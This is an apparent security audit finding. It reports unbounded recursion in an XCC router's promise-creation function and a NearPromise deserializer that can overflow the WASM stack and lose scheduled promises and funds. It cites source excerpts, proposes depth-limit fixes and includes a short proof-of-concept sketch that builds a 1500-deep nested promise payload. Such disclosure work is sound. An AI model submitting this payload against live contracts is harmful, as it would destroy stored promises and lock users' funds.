### Title
Unbounded Recursion in `Router::recursive_promise_create` and `NearPromise::deserialize_reader` Enables Permanent Fund Freeze via XCC Precompile - (File: `etc/xcc-router/src/lib.rs`, `engine-types/src/parameters/promise.rs`)

### Summary

The XCC router's `recursive_promise_create` function and the `NearPromise` Borsh deserializer are both unboundedly recursive with no depth limit enforced anywhere in the pipeline. An unprivileged EVM user can craft a deeply nested `NearPromise::Then` tree and submit it via the XCC precompile as a `Delayed` call. This causes a WASM stack overflow either during deserialization in `schedule` or during promise construction in `execute_scheduled`, permanently destroying the stored promise and freezing any NEAR funds associated with it.

### Finding Description

**Root cause 1 — `recursive_promise_create` is unboundedly recursive:**

`Router::recursive_promise_create` in `etc/xcc-router/src/lib.rs` matches on `NearPromise::Then { base, callback }` and immediately calls itself on `base` with no depth counter or limit:

```rust
fn recursive_promise_create(promise: &NearPromise) -> PromiseIndex {
    match promise {
        NearPromise::Then { base, callback } => {
            let base_index = Self::recursive_promise_create(base); // unbounded recursion
            ...
        }
        NearPromise::And(promises) => {
            let indices: Vec<PromiseIndex> = promises
                .iter()
                .map(Self::recursive_promise_create)  // unbounded recursion
                .collect();
            ...
        }
    }
}
```

**Root cause 2 — `NearPromise::deserialize_reader` is unboundedly recursive:**

The hand-written `BorshDeserialize` implementation for `NearPromise` in `engine-types/src/parameters/promise.rs` calls itself recursively for variant `0x01` (`Then`) with no depth limit:

```rust
0x01 => {
    let base = Self::deserialize_reader(reader)?;  // unbounded recursion
    let callback = SimpleNearPromise::deserialize_reader(reader)?;
    Ok(Self::Then { base: Box::new(base), callback })
}
```

**Root cause 3 — `NearPromise::promise_count` and `total_gas` are also unboundedly recursive:**

Both utility methods on `NearPromise` recurse into `base` without bound, meaning even the gas-cost calculation path in the XCC precompile can overflow the WASM stack.

**Attacker-controlled entry path:**

1. An EVM user calls the XCC precompile (`cross_contract_call::ADDRESS`) with a crafted `CrossContractCallArgs::Delayed(PromiseArgs::Recursive(deeply_nested_promise))` where `deeply_nested_promise` is a `NearPromise::Then` chain of depth D.
2. The XCC precompile in `engine-precompiles/src/xcc.rs` deserializes the input and calls `call.total_near()` and `call.promise_count()` — both recursive — but at moderate depth these succeed.
3. If `attached_near > 0`, the precompile transfers wNEAR from the user to the engine's implicit address (burned from the user's ERC-20 balance).
4. The engine schedules a NEAR promise to call `schedule` on the user's router contract.
5. **Scenario A (overflow in `schedule`):** The router's `schedule` method deserializes the `PromiseArgs` argument via `NearPromise::deserialize_reader`. At sufficient depth, the WASM stack overflows, the call panics, and the NEAR sent to the router is returned to the engine — but the user's wNEAR is already burned and unrecoverable.
6. **Scenario B (overflow in `execute_scheduled`):** At a depth that passes deserialization but overflows `recursive_promise_create`, the promise is stored successfully. When `execute_scheduled` is called (callable by anyone per the comment in the source), it first removes the promise from `scheduled_promises`, then calls `Self::promise_create(promise)` → `Self::recursive_promise_create(&p)`. The WASM stack overflows, the transaction panics, and the promise is permanently erased from storage. Any NEAR that was forwarded to the router for the `attached_balance` of sub-promises is now stuck in the router with no recovery path.

### Impact Explanation

**Severity: Critical — Permanent Freezing of Funds.**

- In Scenario A: The user's wNEAR (ERC-20) is burned during the EVM transaction. The corresponding NEAR is returned to the engine account, not the user. There is no recovery mechanism.
- In Scenario B: The stored promise is removed from `scheduled_promises` before `recursive_promise_create` is called. If the call panics, the promise is gone. Any NEAR held in the router for the promise's `attached_balance` is permanently locked in the router contract with no withdrawal path for the user.

### Likelihood Explanation

**High.** Any EVM user with access to the XCC precompile can submit a `CrossContractCallArgs::Delayed(PromiseArgs::Recursive(...))` with an arbitrarily deep `NearPromise::Then` chain. The only cost to the attacker is EVM gas proportional to the serialized input size (`CROSS_CONTRACT_CALL_BASE + CROSS_CONTRACT_CALL_BYTE * input_len`). A chain of depth ~500–2000 (sufficient to overflow a WASM stack frame budget) has a manageable serialized size. No privileged access is required. `execute_scheduled` is explicitly open to any caller.

### Recommendation

1. **Enforce a maximum depth limit** on `NearPromise` trees before any recursive processing. Add a depth-counting wrapper to `NearPromise::deserialize_reader` that returns an error if depth exceeds a safe constant (e.g., 64 or 128).
2. **Convert `recursive_promise_create` to an iterative implementation** using an explicit stack, eliminating the native call-stack recursion entirely.
3. **Add a depth/count check in the XCC precompile** before accepting a `PromiseArgs::Recursive` input, rejecting inputs whose `promise_count()` exceeds a protocol-defined maximum.
4. **Reorder `execute_scheduled`** to only remove the promise from storage after successful execution, or use a two-phase approach (mark as in-progress, then delete on success).

### Proof of Concept

```
// Attacker constructs a NearPromise::Then chain of depth 1500
let leaf = NearPromise::Simple(SimpleNearPromise::Create(PromiseCreateArgs {
    target_account_id: "victim.near".parse().unwrap(),
    method: "noop".into(),
    args: vec![],
    attached_balance: Yocto::new(1),  // attach 1 yocto to make wNEAR transfer happen
    attached_gas: NearGas::new(5_000_000_000_000),
}));

let deep_promise = (0..1500).fold(leaf, |acc, _| NearPromise::Then {
    base: Box::new(acc),
    callback: SimpleNearPromise::Create(PromiseCreateArgs {
        target_account_id: "victim.near".parse().unwrap(),
        method: "noop".into(),
        args: vec![],
        attached_balance: Yocto::new(0),
        attached_gas: NearGas::new(5_000_000_000_000),
    }),
});

let xcc_args = CrossContractCallArgs::Delayed(PromiseArgs::Recursive(deep_promise));
let calldata = borsh::to_vec(&xcc_args).unwrap();

// Submit EVM transaction calling cross_contract_call::ADDRESS with calldata
// -> wNEAR is transferred from attacker, schedule() is called on router
// -> schedule() succeeds (depth 1500 passes deserialization)
// -> Promise stored at nonce N

// Anyone calls execute_scheduled(nonce: N)
// -> scheduled_promises.remove(&N) succeeds (promise is now gone from storage)
// -> recursive_promise_create recurses 1500 levels deep
// -> WASM stack overflows, transaction panics
// -> Promise permanently lost, NEAR stuck in router
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** etc/xcc-router/src/lib.rs (L146-156)
```rust
    /// It is intentional that this function can be called by anyone (not just the parent).
    /// There is no security risk to allowing this function to be open because it can only
    /// act on promises that were created via `schedule`.
    #[payable]
    pub fn execute_scheduled(&mut self, nonce: U64) {
        let Some(promise) = self.scheduled_promises.remove(&nonce.0) else {
            env::panic_str("ERR_PROMISE_NOT_FOUND")
        };
        let promise_id = Self::promise_create(promise);
        env::promise_return(promise_id);
    }
```

**File:** etc/xcc-router/src/lib.rs (L242-282)
```rust
    fn recursive_promise_create(promise: &NearPromise) -> PromiseIndex {
        match promise {
            NearPromise::Simple(x) => match x {
                SimpleNearPromise::Create(call) => Self::base_promise_create(call),
                SimpleNearPromise::Batch(batch) => {
                    let target = batch.target_account_id.as_ref().parse().unwrap();
                    let id = env::promise_batch_create(&target);
                    Self::add_batch_actions(id, &batch.actions);
                    id
                }
            },
            NearPromise::Then { base, callback } => {
                let base_index = Self::recursive_promise_create(base);
                match callback {
                    SimpleNearPromise::Create(call) => env::promise_then(
                        base_index,
                        call.target_account_id.as_ref().parse().unwrap(),
                        call.method.as_str(),
                        &call.args,
                        NearToken::from_yoctonear(call.attached_balance.as_u128()),
                        Gas::from_gas(call.attached_gas.as_u64()),
                    ),
                    SimpleNearPromise::Batch(batch) => {
                        let id = env::promise_batch_then(
                            base_index,
                            &batch.target_account_id.as_ref().parse().unwrap(),
                        );
                        Self::add_batch_actions(id, &batch.actions);
                        id
                    }
                }
            }
            NearPromise::And(promises) => {
                let indices: Vec<PromiseIndex> = promises
                    .iter()
                    .map(Self::recursive_promise_create)
                    .collect();
                env::promise_and(&indices)
            }
        }
    }
```

**File:** engine-types/src/parameters/promise.rs (L114-122)
```rust
impl NearPromise {
    #[must_use]
    pub fn promise_count(&self) -> u64 {
        match self {
            Self::Simple(_) => 1,
            Self::Then { base, .. } => base.promise_count() + 1,
            Self::And(ps) => ps.iter().map(Self::promise_count).sum(),
        }
    }
```

**File:** engine-types/src/parameters/promise.rs (L178-208)
```rust
impl BorshDeserialize for NearPromise {
    fn deserialize_reader<R: io::Read>(reader: &mut R) -> io::Result<Self> {
        let variant_byte = {
            let mut buf = [0u8; 1];
            reader.read_exact(&mut buf)?;
            buf[0]
        };
        match variant_byte {
            0x00 => {
                let inner = SimpleNearPromise::deserialize_reader(reader)?;
                Ok(Self::Simple(inner))
            }
            0x01 => {
                let base = Self::deserialize_reader(reader)?;
                let callback = SimpleNearPromise::deserialize_reader(reader)?;
                Ok(Self::Then {
                    base: Box::new(base),
                    callback,
                })
            }
            0x02 => {
                let promises: Vec<Self> = Vec::deserialize_reader(reader)?;
                Ok(Self::And(promises))
            }
            _ => Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "Invalid variant byte for NearPromise",
            )),
        }
    }
}
```

**File:** engine-precompiles/src/xcc.rs (L137-173)
```rust
        let args = CrossContractCallArgs::try_from_slice(input)
            .map_err(|_| ExitError::Other(Cow::from(consts::ERR_INVALID_INPUT)))?;
        let (promise, attached_near) = match args {
            CrossContractCallArgs::Eager(call) => {
                let call_gas = call.total_gas();
                let attached_near = call.total_near();
                let callback_count = call
                    .promise_count()
                    .checked_sub(1)
                    .ok_or_else(|| ExitError::Other(Cow::from(consts::ERR_INVALID_INPUT)))?;
                let router_exec_cost = costs::ROUTER_EXEC_BASE
                    + NearGas::new(callback_count * costs::ROUTER_EXEC_PER_CALLBACK.as_u64());
                let promise = PromiseCreateArgs {
                    target_account_id,
                    method: consts::ROUTER_EXEC_NAME.into(),
                    args: borsh::to_vec(&call)
                        .map_err(|_| ExitError::Other(Cow::from(consts::ERR_SERIALIZE)))?,
                    attached_balance: ZERO_YOCTO,
                    attached_gas: router_exec_cost.saturating_add(call_gas),
                };
                (promise, attached_near)
            }
            CrossContractCallArgs::Delayed(call) => {
                let attached_near = call.total_near();
                let promise = PromiseCreateArgs {
                    target_account_id,
                    method: consts::ROUTER_SCHEDULE_NAME.into(),
                    args: borsh::to_vec(&call)
                        .map_err(|_| ExitError::Other(Cow::from(consts::ERR_SERIALIZE)))?,
                    attached_balance: ZERO_YOCTO,
                    // We don't need to add any gas to the amount need for the schedule call
                    // since the promise is not executed right away.
                    attached_gas: costs::ROUTER_SCHEDULE,
                };
                (promise, attached_near)
            }
        };
```
